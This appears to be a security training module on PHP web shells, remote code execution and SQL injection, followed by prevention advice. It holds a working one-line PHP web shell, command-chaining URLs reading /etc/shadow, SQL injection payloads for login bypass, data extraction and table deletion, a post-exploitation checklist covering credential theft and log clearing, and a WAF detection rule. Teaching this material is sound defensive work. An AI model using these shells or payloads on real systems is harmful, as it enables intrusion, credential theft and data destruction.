Web Shell Fundamentals

Gateway to Remote Server Control

What is a Web Shell?

A web shell is a script (PHP, ASP, JSP, ASPX) placed on a web server that enables remote command execution through HTTP requests. It transforms the web server into a remote command interface.

Web Shell Characteristics

  • Server-Side Script: Executes on web server, not in browser
  • HTTP Access: Controlled via browser or HTTP tools
  • Command Execution: Runs OS commands with web server privileges
  • Persistent: Remains until discovered and removed
  • Stealthy: Can be hidden or encoded to evade detection
  • Flexible: Accept input via GET/POST/COOKIE parameters

Critical Threats from Web Shells

  • Instant Access: No credentials needed after upload
  • Full Control: Execute any command web server can run
  • Data Theft: Access sensitive files and databases
  • Malware Deployment: Install backdoors, viruses, ransomware
  • Lateral Movement: Pivot to other systems on network
  • Persistence: Maintain access for months undetected

Deployment Prerequisites

  • Upload Capability: Writable directory (uploads, /tmp, /var/tmp)
  • Script Execution: Server must process PHP/ASP/JSP files
  • Permissions: File must be readable and executable
  • Access: Web path must be accessible via HTTP/HTTPS
  • No Filtering: WAF must not block script uploads or execution

Web Shell Detection Indicators

  • New PHP files in web root with suspicious names
  • Recently modified files in upload directories
  • Unusual permissions on web accessible files (777, 755)
  • Spike in web server process creation
  • Unusual web server network connections (reverse shells)
  • Large number of 200 responses to unusual URLs

PHP system() Function

Direct Command Execution with Output

system() Function Details

  • Purpose: Execute external command and output directly
  • Syntax: system(command, return_var)
  • Output: Sent directly to browser stream
  • Return: Last line of output (as string)
  • Status: Populates return_var with exit code
  • Deprecated: In PHP 8.0+, but still used in legacy systems

system() Usage Examples

<?php
// Example 1: Simple system() call
system("ls -la /tmp");

// Example 2: With return variable
system("whoami", $status);
if($status == 0) {
    echo "Command successful";
}

// Example 3: Command from URL parameter
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}

// Example 4: Capture and modify output (via shell_exec)
$output = shell_exec("pwd");
echo "Current: " . $output;
?>

PHP shell_exec() Function

Command Execution with String Return

shell_exec() Characteristics

  • Purpose: Execute command via shell, return output as string
  • Syntax: $output = shell_exec(command)
  • Return: Complete command output as string
  • Output Type: Returns NULL if command fails
  • String Manipulation: Output can be stored, modified, formatted
  • Backtick Operator: `command` is equivalent to shell_exec()

shell_exec() Usage

<?php
// Example 1: Basic execution and output
$output = shell_exec("ls -la");
echo "<pre>" . $output . "</pre>";

// Example 2: With pipes and filtering
$users = shell_exec("cat /etc/passwd | grep home");
echo $users;

// Example 3: Backtick operator (equivalent)
$whoami = `whoami`;
echo "Current user: " . $whoami;

// Example 4: Command substitution
$files = shell_exec("find /var/www -name '*.php' -type f");
$count = count(explode("\n", $files));
echo "Found " . $count . " PHP files";

// Example 5: Error handling
$output = shell_exec("cat /etc/shadow 2>&1");
if($output === null) {
    echo "Command failed or permission denied";
}
?>

PHP exec() & passthru() Functions

Advanced Command Execution Methods

exec() Function

  • Purpose: Execute command, return last line
  • Syntax: exec(command, output_array, status_code)
  • Output Array: Can populate array with all output lines
  • Status Code: Captures exit code for error checking
  • Usefulness: Best for capturing and processing output

passthru() Function

  • Purpose: Execute command and output binary data
  • Syntax: passthru(command, status_code)
  • Output: Direct to browser (like system())
  • Binary Handling: Preserves binary output (images, files)
  • Use Case: Download files, display binary data

exec() Usage

<?php
// Example 1: Basic exec()
$last_line = exec("ls -la");
echo "Last line: " . $last_line;

// Example 2: Output array
exec("ls -la", $output);
foreach($output as $line) {
    echo $line . "<br>";
}

// Example 3: With status code
$return = 0;
exec("whoami", $out, $return);
echo "Exit code: " . $return;
if($return == 0) {
    echo "Success: " . $out[0];
} else {
    echo "Failed";
}

// Example 4: Process large output
exec("cat /var/log/apache2/access.log", $lines);
$total_lines = count($lines);
echo "Total log lines: " . $total_lines;
?>

passthru() for File Download

<?php
// Download files via passthru()
if(isset($_GET['file'])) {
    $file = $_GET['file'];
    
    // Security: whitelist files only
    $allowed = array('config.php', 'database.sql');
    
    if(in_array($file, $allowed)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . $file);
        passthru("cat " . escapeshellarg($file));
    }
}

// Example:
// http://target.com/shell.php?file=config.php
// Downloads config.php to attacker's machine
?>

Remote Code Execution (RCE) Overview

Achieving Command-Level Access

What is Remote Code Execution?

RCE is the ability to execute arbitrary code or commands on a target system remotely. It's the most critical vulnerability because it gives attackers complete control over the compromised system.

RCE Severity Ranking

Vulnerability Type Severity Impact
XSS (Cross-Site Scripting) Medium Client-side attacks only
SQL Injection High Database compromise
RCE (Remote Code Execution) CRITICAL Full system control

Common RCE Attack Vectors

  • File Upload: Upload web shell to executable directory
  • Command Injection: Inject OS commands into application input
  • Code Injection: Inject PHP/Python code into eval() functions
  • Deserialization: Exploit unsafe object deserialization
  • Template Injection: Abuse template engines for code execution
  • XXE (XML External Entity): Execute commands via XML processing

RCE Attack Timeline

  1. Reconnaissance: Identify vulnerable web application (2-4 hours)
  2. Vulnerability Discovery: Find file upload or injection point (1-2 hours)
  3. Payload Creation: Create web shell or exploit code (30 minutes)
  4. Deployment: Upload shell or execute injection (5 minutes)
  5. Access Verification: Test command execution (1 minute)
  6. Privilege Escalation: Attempt to gain root/admin (variable)
  7. Persistence: Install backdoors for future access (30 minutes)

⚠️ Post-RCE Exploitation

  • Enumerate system and network information
  • Steal database credentials from config files
  • Extract session cookies and authentication tokens
  • Access sensitive files and directories
  • Modify application code for persistence
  • Create new user accounts or backdoors
  • Deploy ransomware, miners, or malware

Runtime Command Execution

Exploiting URL Parameters for OS Commands

Runtime Execution Concept

Passing OS commands through HTTP request parameters (GET, POST, COOKIE) to be executed by PHP functions. The web server processes the command as if it was entered from the command line.

Basic Runtime Execution

# Vulnerable PHP code (original)
<?php
$filename = $_GET['file'];
system("cat " . $filename);
?>

# Attacker input:
http://target.com/view.php?file=/etc/passwd

# Executed command:
cat /etc/passwd

# Output: Password file content displayed in browser

Command Chaining in Runtime Execution

# Using semicolon to chain commands
http://target.com/shell.php?cmd=ls;whoami;id

# Using && (if previous succeeds)
http://target.com/shell.php?cmd=cat%20/etc/shadow%20&&%20echo%20"Success"

# Using || (if previous fails)
http://target.com/shell.php?cmd=cat%20/root/file%20||%20echo%20"Access Denied"

# Using | (pipe)
http://target.com/shell.php?cmd=cat%20/etc/passwd%20|%20grep%20root

# Using > (redirect)
http://target.com/shell.php?cmd=whoami%20>%20/tmp/test.txt

# Using $() (command substitution)
http://target.com/shell.php?cmd=echo%20$(whoami)

✓ URL Parameter Encoding Reference

  • Space = %20
  • / = %2F
  • | (pipe) = %7C
  • & (ampersand) = %26
  • ; (semicolon) = %3B
  • > (greater than) = %3E
  • < (less than) = %3C
  • " (quote) = %22
  • ' (single quote) = %27
  • $ = %24

SQL Injection Fundamentals

Understanding Database Exploitation

What is SQL Injection?

SQL Injection is a code injection technique where attackers insert malicious SQL statements into entry fields. This allows them to manipulate database queries and access unauthorized data.

Vulnerable PHP Code:

$user = $_GET['user'];
$password = $_GET['pass'];
$query = "SELECT * FROM users WHERE username='$user' AND password='$password'";
$result = mysql_query($query);
if(mysql_num_rows($result) > 0) {
    echo "Login Successful";
}
SQL Injection Methods:
Union-Based
Time-Based Blind
Boolean-Based Blind
Error-Based

SQL Injection Attack Examples

Practical Exploitation Techniques

Example 1: Authentication Bypass

# Input in username field:
admin' --

# Results in query:
SELECT * FROM users WHERE username='admin' --' AND password='anything'

# The -- comments out the password check
# Attacker logs in as admin without a password

Example 2: Union-Based SQL Injection

# Vulnerable parameter: id=1
# Attacker injects: id=1 UNION SELECT 1,username,password,4 FROM users--

# This returns user credentials alongside normal data
# Attacker can extract usernames and password hashes

Example 3: Stacked Queries

# Some databases allow multiple queries:
id=1; DROP TABLE users;--

# This could delete entire tables
# Demonstrates severity of SQL injection vulnerabilities

Example 4: Time-Based Blind SQL Injection

# When error messages are suppressed
# Attacker uses response time to detect successful injection

# Payload:
username=admin' AND SLEEP(5)--

# Server response:
- Successful query = 5 second delay
- Failed query = normal response time

# Attacker can brute force character by character:
username=admin' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0)--

# If 5 second delay = 'a' is correct
# If no delay = try next character

Example 5: Boolean-Based Blind SQL Injection

# Detecting true/false states from responses

id=1' AND 1=1--     (returns results)
id=1' AND 1=2--     (returns no results)

# Attacker uses true/false responses to extract data:
id=1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--

# True response = page shows user
# False response = page shows "User not found"

# Can extract entire database by checking one character at a time
# Slower than union-based but works against protected databases

SQL Injection Prevention

Defensive Coding Practices

1. Parameterized Queries / Prepared Statements

Best Practice: Always separate SQL code from user data

# WRONG - Vulnerable to SQL Injection:
$query = "SELECT * FROM users WHERE username='" . $_GET['user'] . "'";
$result = mysql_query($query);
# If user inputs: admin' OR '1'='1  <- SQL injection!

# CORRECT - Prepared Statement (PHP PDO):
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
$stmt->execute([$_GET['user']]);
$result = $stmt->fetchAll();

# CORRECT - Named Parameters:
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND email = :email");
$stmt->execute([':username' => $_GET['user'], ':email' => $_GET['email']]);

# CORRECT - Prepared Statement (MySQLi):
$stmt = $mysqli->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $_GET['user']);  # 's' = string type
$stmt->execute();
$result = $stmt->get_result();

# How it works:
# 1. SQL structure sent to database first
# 2. Database parser processes SQL structure
# 3. User data sent separately
# 4. Database treats user data as DATA, not SQL code
# 5. Even if user data contains SQL keywords, they are treated as strings

2. Input Validation (Whitelist Approach)

# Validate ID is numeric:
if (!ctype_digit($_GET['id']) || $_GET['id'] < 0 || $_GET['id'] > 9999999) {
    die('Invalid ID format');
}

# Validate email format:
if (!filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    die('Invalid email format');
}

# Validate against allowed values:
$allowed_sort = ['name', 'date', 'price'];
if (!in_array($_GET['sort'], $allowed_sort)) {
    die('Invalid sort parameter');
}

# Strict type checking:
$id = (int)$_GET['id'];    # Force to integer
$price = (float)$_GET['price'];  # Force to float

# Length validation:
if (strlen($_GET['search']) > 50 || strlen($_GET['search']) < 1) {
    die('Invalid search length');
}

# Pattern matching:
if (!preg_match('/^[a-zA-Z0-9_-]{3,20}$/', $_GET['username'])) {
    die('Invalid username format');
}

# Server-side validation ONLY:
# Client-side validation can be bypassed
# Always validate on the server

3. Escape User Input (Defense in Depth)

# NOT a primary defense, but additional layer
# Only use with prepared statements

# PHP MySQLi - Escape strings:
$escaped = $mysqli->real_escape_string($_GET['user']);
$query = "SELECT * FROM users WHERE username='$escaped'";

# PHP PDO - Quote input:
$escaped = $pdo->quote($_GET['user']);
$query = "SELECT * FROM users WHERE username=$escaped";

# Important: These are NOT sufficient alone
# Must use prepared statements as primary defense

4. Least Privilege Database User

# Create separate database users for different functions

# WRONG - Using admin account:
$user = 'root';
$pass = 'admin123';
$mysqli = new mysqli('localhost', $user, $pass, 'wordpress_db');
# If SQL injection occurs, attacker has admin privileges

# CORRECT - Limited privilege account:
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'SecurePass123';
GRANT SELECT, INSERT, UPDATE ON wordpress_db.wp_posts TO 'webapp'@'localhost';
GRANT SELECT, INSERT, UPDATE ON wordpress_db.wp_users TO 'webapp'@'localhost';
REVOKE DELETE, DROP, CREATE ON *.* FROM 'webapp'@'localhost';

# Connect with limited user:
$user = 'webapp';
$pass = 'SecurePass123';
$mysqli = new mysqli('localhost', $user, $pass, 'wordpress_db');

# Now even if attacker exploits SQL injection:
# - Cannot drop tables (no DROP privilege)
# - Cannot access other databases
# - Cannot modify table structure
# - Limited to SELECT, INSERT, UPDATE on specific tables

# For read-only operations:
CREATE USER 'report'@'localhost' IDENTIFIED BY 'ReportPass123';
GRANT SELECT ON wordpress_db.* TO 'report'@'localhost';
# Can only read, cannot modify data

5. Error Handling & Information Disclosure

# WRONG - Shows database structure:
$result = mysql_query($query) or die('Error: ' . mysql_error());
# Output: Error: Column 'username' doesn't exist
# Attacker learns table structure!

# CORRECT - Generic error to user:
set_error_handler(function() {
    if ($_SERVER['ENVIRONMENT'] === 'production') {
        die('An error occurred. Please try again later.');
    }
});

$result = $stmt->execute();
if (!$result) {
    // Log detailed error to file (not shown to user)
    error_log('Database error: ' . $stmt->error);
    die('Database error.');
}

# In development:
ini_set('display_errors', 1);
// Show detailed errors

# In production:
ini_set('display_errors', 0);
error_reporting(E_ALL);
ini_set('log_errors', 1);
ini_set('error_log', '/var/log/php-errors.log');
// Log to file, show nothing to user

6. Web Application Firewall (WAF)

Additional layer of defense monitoring HTTP requests

# ModSecurity (Apache mod_security)
# Rules detect common SQL injection patterns

SecRule ARGS "(union|select|from|where|insert|update|delete|drop|create|alter)" \
    "chain,phase:2,deny,status:403,msg:'SQL Injection Attempt'"
    SecRule ARGS "(;|--|/\*|\*/)"

# WAF can:
# - Block requests matching SQL injection patterns
# - Log suspicious activity
# - Alert security team
# - Rate limit suspicious IPs

# Examples blocked:
# /page.php?id=1 UNION SELECT 1,2,3       <- Blocked
# /login.php?user=admin' OR '1'='1        <- Blocked
# /search.php?q=test'; DROP TABLE--       <- Blocked

# Note: WAF is not primary defense
# Still need proper input validation and prepared statements

Module Completion: Web Shells, RCE & SQL Injection

Complete Review & Key Takeaways

Web Shells & RCE Attack Methods

  • Web Shells: PHP/ASP files uploaded to web directory enabling command execution via HTTP
  • PHP Dangerous Functions: system(), shell_exec(), exec(), passthru() all execute OS commands
  • File Upload Exploitation: Bypass file type filters (double extension, MIME type manipulation, polyglot files)
  • Parameter Injection: Commands embedded in GET/POST parameters executed by PHP functions
  • Template Injection: Twig/Jinja2/Smarty templates can execute code if user input processed
  • Log File Inclusion: Inject PHP code into logs, include logs as PHP file

RCE Post-Exploitation Steps

  1. Verify Access: whoami, id, pwd confirm shell functionality
  2. Enumerate System: uname -a, cat /etc/passwd, ls -la / find configuration/sensitive file locations
  3. Privilege Discovery: sudo -l, find / -perm -4000 identify privilege escalation paths
  4. Credential Harvesting: cat config.php, .env files, SSH keys, bash history
  5. Lateral Movement: Use stolen credentials to access other systems
  6. Persistence: Create backdoor accounts, cron jobs, modify startup scripts
  7. Covering Tracks: Clear logs, remove evidence of intrusion

SQL Injection Attack Methods

  • Authentication Bypass: admin' -- or admin' OR '1'='1 to bypass login
  • Union-Based: UNION SELECT to extract data from other tables
  • Boolean-Based Blind: True/false responses determine data character-by-character
  • Time-Based Blind: SLEEP(5) responses determine successful injection
  • Error-Based: Exploit error messages to extract data
  • Stacked Queries: Multiple SQL statements in single injection (database-dependent)
  • Second-Order: Stored SQL injection in database, executed later

SQL Injection Exploitation Steps

  1. Identify Vulnerability: Test parameters with quotes, AND, OR, UNION syntax
  2. Determine Database Type: @@version (MySQL), @@SERVERNAME (MSSQL), version() (PostgreSQL)
  3. Find Column Count: ORDER BY X, UNION SELECT with NULLs
  4. Enumerate Databases: information_schema.tables query
  5. Enumerate Tables: Find users, admin, passwords tables
  6. Enumerate Columns: Find username, password, email columns
  7. Extract Data: UNION SELECT to retrieve usernames, passwords, emails
  8. Crack Passwords: Use extracted hashes with John, Hashcat, rainbow tables

Critical Defense Principles

  • Never Trust User Input: All input must be validated, sanitized, treated as hostile
  • Prepared Statements: ALWAYS use parameterized queries; separate code from data
  • Least Privilege: Database users limited to required permissions only
  • Defense in Depth: Multiple layers (prepared statements, validation, WAF, monitoring)
  • Disable Dangerous Functions: system(), exec(), shell_exec() should be disabled
  • Error Suppression: Generic errors to user; detailed logs to secure file
  • File Upload Security: Validate type/extension, store outside webroot
  • Stay Updated: Patch frameworks, libraries, database software immediately
  • Security Testing: Regular code reviews, SAST/DAST scanning, penetration testing
